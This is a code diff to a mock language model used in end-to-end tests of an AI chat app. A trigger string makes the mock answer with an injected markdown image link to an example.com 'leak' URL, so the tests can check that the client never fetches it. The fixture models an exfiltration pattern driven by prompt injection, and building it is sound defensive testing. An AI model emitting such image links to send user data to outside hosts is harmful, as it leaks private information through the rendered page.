@@ -2,10 +2,33 @@ import 'server-only';
 import { simulateReadableStream } from 'ai';
 import { MockEmbeddingModelV4, MockLanguageModelV4 } from 'ai/test';
 
+type Prompt = Parameters<MockLanguageModelV4['doStream']>[0]['prompt'];
+
 // Deterministic stand-ins for E2E tests and CI (AI_PROVIDER=mock). lib/env.ts
 // refuses this provider in Vercel production.
 
 export const MOCK_ANSWER = 'According to your sources, this is a mock answer [1].';
+
+// A question containing this marker makes the mock model answer with an
+// injected image markdown link, so E2E can assert the client never turns it
+// into a network request (conventions/security.md §9) without needing a real
+// provider to reproduce an attacker-controlled source.
+export const MOCK_LEAK_TRIGGER = 'mock-leak-test';
+export const MOCK_LEAK_ANSWER =
+  'Here is what your source says [1]: ![x](https://example.com/leak?q=test)';
+
+function lastUserQuestion(prompt: Prompt): string {
+  const lastUserMessage = [...prompt].reverse().find((message) => message.role === 'user');
+  if (!lastUserMessage) return '';
+  return lastUserMessage.content
+    .filter((part): part is Extract<typeof part, { type: 'text' }> => part.type === 'text')
+    .map((part) => part.text)
+    .join(' ');
+}
+
+function answerFor(prompt: Prompt): string {
+  return lastUserQuestion(prompt).includes(MOCK_LEAK_TRIGGER) ? MOCK_LEAK_ANSWER : MOCK_ANSWER;
+}
 
 function fnv1a(text: string): number {
   let hash = 0x811c9dc5;
@@ -38,39 +61,47 @@ function countWords(text: string): number {
   return text.split(/\s+/).filter(Boolean).length;
 }
 
-const usage = {
-  inputTokens: { total: 10, noCache: 10, cacheRead: undefined, cacheWrite: undefined },
-  outputTokens: {
-    total: countWords(MOCK_ANSWER),
-    text: countWords(MOCK_ANSWER),
-    reasoning: undefined,
-  },
-};
+function usageFor(answer: string) {
+  return {
+    inputTokens: { total: 10, noCache: 10, cacheRead: undefined, cacheWrite: undefined },
+    outputTokens: { total: countWords(answer), text: countWords(answer), reasoning: undefined },
+  };
+}
 
 export function mockChatModel(modelId: string): MockLanguageModelV4 {
   return new MockLanguageModelV4({
     provider: 'mock',
     modelId,
-    doGenerate: async () => ({
-      content: [{ type: 'text', text: MOCK_ANSWER }],
-      finishReason: { unified: 'stop', raw: undefined },
-      usage,
-      warnings: [],
-    }),
-    doStream: async () => ({
-      stream: simulateReadableStream({
-        chunks: [
-          { type: 'text-start', id: 'text-1' },
-          ...MOCK_ANSWER.split(/(?<= )/).map((delta) => ({
-            type: 'text-delta' as const,
-            id: 'text-1',
-            delta,
-          })),
-          { type: 'text-end', id: 'text-1' },
-          { type: 'finish', finishReason: { unified: 'stop', raw: undefined }, usage },
-        ],
-      }),
-    }),
+    doGenerate: async ({ prompt }) => {
+      const answer = answerFor(prompt);
+      return {
+        content: [{ type: 'text', text: answer }],
+        finishReason: { unified: 'stop', raw: undefined },
+        usage: usageFor(answer),
+        warnings: [],
+      };
+    },
+    doStream: async ({ prompt }) => {
+      const answer = answerFor(prompt);
+      return {
+        stream: simulateReadableStream({
+          chunks: [
+            { type: 'text-start', id: 'text-1' },
+            ...answer.split(/(?<= )/).map((delta) => ({
+              type: 'text-delta' as const,
+              id: 'text-1',
+              delta,
+            })),
+            { type: 'text-end', id: 'text-1' },
+            {
+              type: 'finish',
+              finishReason: { unified: 'stop', raw: undefined },
+              usage: usageFor(answer),
+            },
+          ],
+        }),
+      };
+    },
   });
 }
 
